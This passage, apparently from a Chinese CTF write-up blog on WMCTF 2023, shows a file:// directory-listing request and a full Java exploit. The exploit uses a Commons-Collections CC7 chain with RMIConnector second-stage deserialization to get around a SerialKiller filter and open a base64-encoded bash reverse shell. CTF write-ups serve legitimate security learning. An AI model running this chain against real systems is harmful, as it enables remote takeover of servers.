class="name">whitelist</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>同时在lib里发现<code>commons-collections-3.2.1.jar</code>依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Imagefile?url1=file:////usr/local/tomcat/webapps/ROOT/WEB-INF/lib%23java</span><br></pre></td></tr></table></figure>

<p><code>config/serialkiller.xml</code>中过滤了cc1-6的关键类，导致不能直接反序列化。这里可以选择cc7作为代替，过滤<code>&lt;regexp&gt;java\.security\.SignedObject$&lt;/regexp&gt;</code>也相当于给了提示——二次反序列化，利用<code>RMIConnector</code>二次反序列化bypass关键类</p>
<p><strong>exp</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        基于Hashtable的利用链</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class="line">        setField(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/&quot;</span> + getEvilCode());</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, invokerTransformer);</span><br><span class="line">        lazyMap1.put(<span class="number">1</span>, <span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, invokerTransformer);</span><br><span class="line">        <span class="comment">//将rmiConnector put进去</span></span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, rmiConnector);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//参考cc6 yseoserial Node exploit</span></span><br><span class="line">        <span class="comment">//获取HashMap的table属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//从hashmap对象中获取table属性的值（返回的是一个HashMap.Node类型的数组）</span></span><br><span class="line">        Object[] array = (Object[])table.get(hashMap1);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//获取HashMap.Node类中的key属性</span></span><br><span class="line">        keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//然后将HashMap.Node类中的key属性设置为rmiConnector对象</span></span><br><span class="line">        keyField.set(node, rmiConnector);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(base64Encode(bytes1));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//任意符合CC3.2.1的CC链</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getEvilCode</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//反弹shell</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eC85NTAwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//随便设置一个值，防止后面再执行put方法的时候调用链子</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;useless&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry, <span class="string">&quot;def&quot;</span>);</span><br><span class="line">        <span class="comment">//修改为HashSet调用readObject方法</span></span><br><span class="line">        HashSet&lt;Object&gt; hashSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        setField(hashSet, <span class="string">&quot;map&quot;</span>, hashMap2);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        <span class="comment">//反射修改LazyMap的factory属性，修改为链子的后半段</span></span><br><span class="line">        setField(lazyMap, <span class="string">&quot;factory&quot;</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashSet);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Str</span> <span class="operator">=</span> base64Encode(bytes1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> base64Str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pPLgz01"><img src="https://z1.ax1x.com/2023/10/02/pPLgz01.png" alt="pPLgz01.png"></a></p>
<h2 id="Traveller"><a href="#Traveller" class="headerlink" title="Traveller"></a>Traveller</h2><p>TODO</p>
<h2 id="ez-challenge"><a href="#ez-challenge" class="headerlink" title="ez_challenge"></a>ez_challenge</h2><p>TODO</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://gh0st.com.cn">gh0st</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://gh0st.com.cn/2023/08/22/wmctf/">https://gh0st.com.cn/2023/08/22/wmctf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://gh0st.com.cn" target="_blank">gh0st's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wmctf/">wmctf</a><a class="post-meta__tags" href="/tags/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/">主从复制</a></div><div class="post_share"><div class="social-share" data-image="https://s1.ax1x.com/2023/08/23/pPJI5Eq.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/03/YCB/"><img class="prev-cover" src="https://z1.ax1x.com/2023/10/01/pPLSRTx.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023羊城杯</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/10/%E6%B5%85%E8%B0%88Java%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><img class="next-cover" src="https://s1.ax1x.com/2023/07/10/pCR4DK0.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">浅谈Java下的命令执行</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">gh0st</div><div class="author-info__description">A blog that records learning</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WMCTF-2023"><span class="toc-number">1.</span> <span class="toc-text">WMCTF 2023</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AnyFileRead"><span class="toc-number">1.1.</span> <span class="toc-text">AnyFileRead</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-java-agagin"><span class="toc-number">1.2.</span> <span class="toc-text">ez_java_agagin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezblog"><span class="toc-number">1.3.</span> <span class="toc-text">ezblog</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezblog2"><span class="toc-number">1.4.</span> <span class="toc-text">ezblog2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E7%9A%84%E6%9D%83%E9%99%90%E6%94%BE%E7%9D%80%E6%88%91%E6%9D%A5"><span class="toc-number">1.5.</span> <span class="toc-text">你的权限放着我来</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-java-agagin-rev"><span class="toc-number">1.6.</span> <span class="toc-text">ez_java_agagin_rev</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Traveller"><span class="toc-number">1.7.</span> <span class="toc-text">Traveller</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-challenge"><span class="toc-number">1.8.</span> <span class="toc-text">ez_challenge</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/11/14/secObj/" title="浙江省赛Java"><img src="https://z1.ax1x.com/2023/11/21/pias5Kf.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="浙江省赛Java"/></a><div class="content"><a class="title" href="/2023/11/14/secObj/" title="浙江省赛Java">浙江省赛Java</a><time datetime="2023-11-14T11:34:23.000Z" title="发表于 2023-11-14 19:34:23">2023-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/03/0xGame/" title="0xGame web（全解）"><img src="https://z1.ax1x.com/2023/11/06/piQzv8g.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="0xGame web（全解）"/></a><div class="content"><a class="title" href="/2023/11/03/0xGame/" title="0xGame web（全解）">0xGame web（全解）</a><time datetime="2023-11-03T01:11:23.000Z" title="发表于 2023-11-03 09:11:23">2023-11-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/25/%E9%9B%B6%E9%9B%B6%E6%95%A3%E6%95%A3/" title="old fragmented wp ~"><img src="https://z1.ax1x.com/2023/10/25/piVrIns.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="old fragmented wp ~"/></a><div class="content"><a class="title" href="/2023/10/25/%E9%9B%B6%E9%9B%B6%E6%95%A3%E6%95%A3/" title="old fragmented wp ~">old fragmented wp ~</a><time datetime="2023-10-25T08:10:33.000Z" title="发表于 2023-10-25 16:10:33">2023-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/03/YCB/" title="2023羊城杯"><img src="https://z1.ax1x.com/2023/10/01/pPLSRTx.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2023羊城杯"/></a><div class="content"><a class="title" href="/2023/09/03/YCB/" title="2023羊城杯">2023羊城杯</a><time datetime="2023-09-03T08:11:23.000Z" title="发表于 2023-09-03 16:11:23">2023-09-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/22/wmctf/" title="WMCTF 2023"><img src="https://s1.ax1x.com/2023/08/23/pPJI5Eq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WMCTF 2023"/></a><div class="content"><a class="title" href="/2023/08/22/wmctf/" title="WMCTF 2023">WMCTF 2023</a><time datetime="2023-08-22T09:10:33.000Z" title="发表于 2023-08-22 17:10:33">2023-08-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s1.ax1x.com/2022/11/20/zMWUzQ.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023  <i id="heartbeat" class="fa fas fa-heartbeat"></i> gh0st</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'P30e503whmpCWi5vfGvyBPBk-gzGzoHsz',
      appKey: 'CksZh3B3PQkOckP0wY4WEj9U',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://gh0st.com.cn/2023/08/22/wmctf/'
    this.page.identifier = '/2023/08/22/wmctf/'
    this.page.title = 'WMCTF 2023'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>